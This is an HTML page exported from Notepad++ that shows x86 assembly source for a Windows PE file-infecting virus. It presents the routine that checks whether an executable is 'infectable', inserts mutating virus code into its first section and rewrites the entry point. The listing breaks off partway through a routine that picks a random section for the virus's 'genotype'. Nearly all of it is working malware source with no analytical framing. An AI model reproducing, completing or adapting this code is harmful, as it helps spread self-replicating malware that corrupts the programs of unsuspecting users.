<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">DEBUGOFF</span><span class="sc0">

</span><span class="sc5">INFECTION_MARK</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">101</span><span class="sc0">

</span><span class="sc5">SECTION_MIN</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">;minimum number of sections to be infected</span><span class="sc0">
</span><span class="sc5">SECTION_MAX</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">            </span><span class="sc1">;maximum number of sections to be infected</span><span class="sc0">

</span><span class="sc5">infectf</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">can_infect</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">;init variable</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fname</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">9</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"TAOG"</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
</span><span class="sc1">;int 3</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MapFile</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">File</span><span class="sc0"> </span><span class="sc5">mapped</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">%X</span><span class="sc4">&gt;,</span><span class="sc8">EAX</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fmap</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.MZ_Magic</span><span class="sc4">],</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">peheader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_IsBadCodePtr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_Signature</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PE</span><span class="sc0"> </span><span class="sc5">signature</span><span class="sc0"> </span><span class="sc5">detected</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_FileHeader.FH_Machine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">i386</span><span class="sc0"> </span><span class="sc5">executable</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SECTION_MIN</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SECTION_MAX</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Number</span><span class="sc0"> </span><span class="sc5">Of</span><span class="sc0"> </span><span class="sc5">Sections</span><span class="sc0"> </span><span class="sc5">acceptable</span><span class="sc0"> </span><span class="sc4">(%</span><span class="sc5">x</span><span class="sc4">)&gt;,</span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_NT_OPTIONAL_HEADER</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Optional</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">ok</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_FileHeader.FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_SYSTEM</span><span class="sc4">+</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">File</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">system</span><span class="sc0"> </span><span class="sc5">nor</span><span class="sc0"> </span><span class="sc5">dll</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc4">+</span><span class="sc5">IMAGE_FILE_32BIT_MACHINE</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">File</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">executable</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">run</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc2">32b</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_RELOCS_STRIPPED</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@rel_ok</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">                    </span><span class="sc1">;==FALSE</span><span class="sc0">
  </span><span class="sc5">@@rel_ok</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reloc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_OptionalHeader.OH_Magic</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_OPTIONAL_HDR_MAGIC</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">optional</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc5">signature</span><span class="sc0"> </span><span class="sc5">ok</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_OptionalHeader.OH_Subsystem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SUBSYSTEM_WINDOWS_CUI</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@aaa</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_OptionalHeader.OH_Subsystem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SUBSYSTEM_WINDOWS_GUI</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
  </span><span class="sc5">@@aaa</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Subsystem</span><span class="sc0"> </span><span class="sc5">ok</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_OptionalHeader.OH_NumberOfRvaAndSizes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">correct</span><span class="sc0"> </span><span class="sc5">number</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">entries</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">directory</span><span class="sc0"> </span><span class="sc5">entries</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">entrypoint</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc2">1st</span><span class="sc0"> </span><span class="sc9">section</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS.SH_Characteristics</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_EXECUTE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_16BIT</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">entrypoint</span><span class="sc0"> </span><span class="sc9">section</span><span class="sc0"> </span><span class="sc5">attributes</span><span class="sc0"> </span><span class="sc5">ok</span><span class="sc4">&gt;</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INFECTION_MARK</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">infection</span><span class="sc0"> </span><span class="sc5">mark</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@abort</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">can_infect</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">file</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">infectable</span><span class="sc0">!</span><span class="sc4">&gt;</span><span class="sc0">

  </span><span class="sc5">@@abort</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapFile</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">file</span><span class="sc0"> </span><span class="sc5">unmapped</span><span class="sc4">&gt;</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">can_infect</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;file is good for infect???</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fname</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MapFile</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">File</span><span class="sc0"> </span><span class="sc5">mapped</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">%X</span><span class="sc4">&gt;,</span><span class="sc8">EAX</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fmap</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">peheader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">imagebase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc9">Import</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@error_close</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetModuleHandleA</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc9">IMPORT</span><span class="sc0"> </span><span class="sc5">TABLE</span><span class="sc4">&gt;</span><span class="sc0">

       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;1st section</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mutant_size</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">inserting</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc9">section</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InsertCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Added</span><span class="sc0"> </span><span class="sc5">successfull</span><span class="sc4">&gt;</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">mutant_offset</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">mutant_size</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">insert_raw</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">fmap</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vbody</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Copying</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">insert_rva</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">code_rva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">code_rva</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

       </span><span class="sc1">;***scan for JMP/CALL pointing inside .CODE and change one of they!</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;change entrypoint</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">entrypoint</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">_1st_item</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get first instruction(entry) new offset</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Old</span><span class="sc0"> </span><span class="sc5">entrypoint</span><span class="sc4">=%</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc5">entrypoint</span><span class="sc4">=%</span><span class="sc5">x</span><span class="sc4">&gt;,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnddata</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">eax.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">                 </span><span class="sc1">;choose rnd section for genotype</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mutant_gens</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">rnddata</span><span class="sc4">]</span><span class="sc0">
